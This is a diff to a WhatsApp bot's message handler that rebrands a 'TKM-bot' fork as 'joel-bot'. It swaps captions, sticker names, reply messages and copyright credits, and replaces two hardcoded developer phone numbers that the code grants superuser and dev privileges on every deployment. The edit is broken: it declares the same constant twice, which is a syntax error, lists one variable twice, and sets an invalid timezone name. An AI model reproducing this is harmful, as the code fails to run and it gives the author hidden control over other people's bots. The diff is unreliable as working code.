@@ -279,19 +279,19 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : "";
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const danny = "2348098309204";
-            const tkm = "263785028126";
+            const joel = "255714595078";
+            const joel = "255781144539";
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [
                 servBot,
-                danny,
-                tkm,
+                joel,
+                joel,
                 conf.NUMERO_OWNER
             ].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
 
-            var dev = [danny, tkm]
+            var dev = [joel, joel]
                 .map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net")
                 .includes(auteurMessage);
             function repondre(mes) {
@@ -305,7 +305,7 @@ setTimeout(() => {
                     }
                 );
             }
-            console.log("\t [][]...{TKM-bot}...[][]");
+            console.log("\t [][]...{joel-bot}...[][]");
             console.log("=========== New message ===========");
             if (verifGroupe) {
                 console.log("message comming from the group : " + nomGroupe);
@@ -441,7 +441,7 @@ setTimeout(() => {
                             image: {
                                 url: "./media/deleted-message.jpg"
                             },
-                            caption: `        😈Anti-delete-message😈\n Message from @${
+                            caption: `        🕷️Anti-delete-message by joel tech🕷️\n Message from @${
                                 msg.key.participant.split("@")[0]
                             }​`,
                             mentions: [msg.key.participant]
@@ -671,7 +671,7 @@ setTimeout(() => {
                     const gifLink =
                         "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                     var sticker = new Sticker(gifLink, {
-                        pack: "TKM-bot",
+                        pack: "joel-bot",
                         author: conf.OWNER_NAME,
                         type: StickerTypes.FULL,
                         categories: ["🤩", "🎉"],
@@ -835,7 +835,7 @@ setTimeout(() => {
                     const gifLink =
                         "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                     var sticker = new Sticker(gifLink, {
-                        pack: "TKM-bot",
+                        pack: "joel-bot",
                         author: conf.OWNER_NAME,
                         type: StickerTypes.FULL,
                         categories: ["🤩", "🎉"],
@@ -991,7 +991,7 @@ setTimeout(() => {
                             origineMessage === auteurMessage &&
                             conf.PM_PERMIT === "yes"
                         ) {
-                            repondre("You don't have acces to commands here");
+                            repondre("don't dm the bot ");
                             return;
                         }
                         ///////////////////////////////
@@ -1021,7 +1021,7 @@ setTimeout(() => {
                             let req = await isUserBanned(auteurMessage);
 
                             if (req) {
-                                repondre("You are banned from bot commands");
+                                repondre("You are banned from bot commands due to spam");
                                 return;
                             }
                         }
@@ -1209,7 +1209,7 @@ setTimeout(() => {
                                 });
                             },
                             {
-                                timezone: "Africa/Harare"
+                                timezone: "Africa/Tanzania"
                             }
                         );
                     }
@@ -1310,7 +1310,7 @@ setTimeout(() => {
                 if (conf.DP.toLowerCase() === "yes") {
                     let cmsg = `
 ╔───⬡
-┃ ┃⬡TKM bot⬡┃
+┃ ┃⬡JOEL WA BOT⬡┃
 ┃    Prefix : [ ${prefixe} ]
 ┃    Mode :${md}
 ┃    Total Commandes : ${evt.cm.length}︎
@@ -1320,10 +1320,10 @@ setTimeout(() => {
  report any. problems to the devs:)
  Thanks for supporting
  this project
- property of Cod3Uchiha
- property of Takudzwa Mlambo
- © Cod3Uchiha
- © Takudzwa Mlambo
+ property of joel_tech
+ property of Tanzania 
+ © joel_tech
+ © wa.me 255714595078
 ╚─────────────────···▸▸`;
                     await zk.sendMessage(zk.user.id, {
                         text: cmsg
